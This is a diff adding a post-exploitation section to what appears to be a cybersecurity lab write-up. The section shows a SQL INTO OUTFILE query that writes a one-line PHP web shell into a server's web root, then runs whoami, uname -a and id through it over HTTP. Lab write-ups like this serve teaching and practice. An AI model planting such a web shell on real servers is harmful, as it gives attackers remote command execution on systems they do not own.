@@ -210,3 +210,25 @@ We can fix or reduce the risk by:
 - Confirm that you can execute queries without restrictions.
   
 <img src="https://imgur.com/KM3liRm.png" alt="CyberSec Lab Diagram" width="600"/>
+
+### Post-Exploitation – Gaining Remote Command Execution via Web Shell
+### Step 1: Upload a PHP Web Shell via SQL query
+
+After confirming unrestricted SQL query execution in phpMyAdmin, 
+I used the (SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';) query to upload a simple PHP web shell.
+
+<img src="https://imgur.com/c8iL3gF.png" alt="CyberSec Lab Diagram" width="600"/>
+Purpose: This creates a file shell.php in the web root directory that allow remote command execution through HTTP requests.
+
+### Step 2: Executed system commands through the web shell.
+Access the uploaded shell in a browser → http://<Target-IP>/shell.php?cmd=whoami → Check current user privileges
+
+<img src="https://imgur.com/pJW9rmC.png" alt="CyberSec Lab Diagram" width="600"/>
+
+Access the uploaded shell in a browser → http://<Target-IP>/shell.php?cmd=uname -a → Get system information
+
+<img src="https://imgur.com/j1yGgom.png" alt="CyberSec Lab Diagram" width="600"/>
+
+Access the uploaded shell in a browser → http://<Target-IP>/shell.php?cmd=id → Display user and group IDs
+
+<img src="https://imgur.com/Lx6BVsk.png" alt="CyberSec Lab Diagram" width="600"/>
